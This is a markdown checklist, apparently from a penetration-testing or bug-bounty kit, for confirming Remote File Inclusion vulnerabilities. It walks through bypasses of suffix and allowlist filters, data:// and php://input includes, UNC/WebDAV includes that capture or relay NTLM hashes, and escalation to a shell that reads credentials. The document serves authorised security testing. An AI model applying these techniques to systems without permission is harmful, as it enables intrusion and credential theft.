# RFI Testing Checklist — tick per sink

> Companion to `RFI_TESTING_GUIDE.md`. RFI = **your code executes** on the target (RCE = Critical). A mere fetch is
> **SSRF**. Work top-to-bottom **per include sink**; stop and report only when you've proven execution (or correctly
> reclassified it as SSRF).

## PHASE 0 — Recon & lab (§3/§1)
- [ ] Found include sinks selectable by URL (page/file/include/template/module/plugin/theme params).
- [ ] Checked confirmed LFI **include** sinks (LFI kit) as RFI candidates (test remote URL / data:// there).
- [ ] Stood up a **payload host** serving PHP as `text/plain` and logging hits (`poc/payload_host.py`).
- [ ] Stood up an OOB listener (interactsh) for blind cases.

## PHASE 1 — Baseline: prove EXECUTION (§4)
- [ ] Pointed the include at my host with `<?php echo 7*7*7; ?>` → **"343" appears** = execution = RFI.
- [ ] Distinguished outcomes: executed (RFI) / fetched-only (SSRF) / raw-text (non-exec) / no-hit.
- [ ] Noted forced suffix, `allow_url_include` behavior, and the server source IP.

## PHASE 2 — Make it land (§5–§8)
- [ ] Served the payload as `.txt` / `text/plain` (not executed on my box).
- [ ] Defeated the forced `.php` suffix with `?` (or `%23` / `%00`).
- [ ] Cleared scheme/encoding filters (http/https/ftp, case, slash-confusion, IP-obfuscation).
- [ ] Bypassed any host allowlist (open-redirect bounce / `@` / contains / subdomain).

## PHASE 3 — Equivalents when http:// is blocked (§9/§10)
- [ ] Tested **`data://`** and **`php://input`** (execute without a remote fetch).
- [ ] On Windows: tested **UNC/SMB** include (`\\me\share\shell.php`) via impacket-smbserver.
- [ ] **NTLM capture/relay (§10.1):** even if it doesn't execute, the UNC fetch leaks **NetNTLMv2** to Responder (crack `-m 5600`) or relay (`ntlmrelayx`) — an SSRF/auth-coercion finding on its own.
- [ ] **WebDAV (§10.2):** SMB/445 blocked? → `\\me@80\share\x` / `\\me@SSL@443\share\x` (UNC over HTTP/HTTPS) → executes + leaks hash where raw SMB couldn't.

## PHASE 4 — Impact: RCE (§11–§14)
- [ ] Confirmed RCE with a benign computed marker, then a single `system('id')`/`whoami`.
- [ ] (Authorized red-team only) escalated to a shell / read config for creds (read-only) and **cleaned up**.
- [ ] Blind: proved execution via **callback-carrying-command-output** or **sleep** (not just a fetch).
- [ ] Other stacks: hosted the matching file type (JSP/CFML) or used dynamic require/import (Node) where applicable.

## PHASE 5 — Validate → report
- [ ] Confirmed it's **RFI (execution)**, not SSRF (fetch) (§15) — FP check §16.
- [ ] Used a **benign marker + `id`**; removed any written files/shells; validated read secrets read-only.
- [ ] Confirmed on **production**; re-tested partial fixes (http:// blocked but data:///UNC still works).
- [ ] Set CVSS 3.1 + **CWE-98 (+ CWE-94)** (§17).
- [ ] De-duped to one finding per include sink; led with the cleanest RCE proof (§20).

## AUTO-REJECT (don't submit as RFI if…)
- [ ] The server only **fetched** your URL (no execution) → that's **SSRF**, report it there.
- [ ] Your raw `<?php` text merely **displayed** in the page (non-executing context).
- [ ] An open redirect / remote image load mislabeled as RFI.
- [ ] `http://` was refused and you **didn't** test `data://`/`php://input`/UNC.
- [ ] Only a blind hit with **no execution proof**.
- [ ] DoS via including a huge remote file.
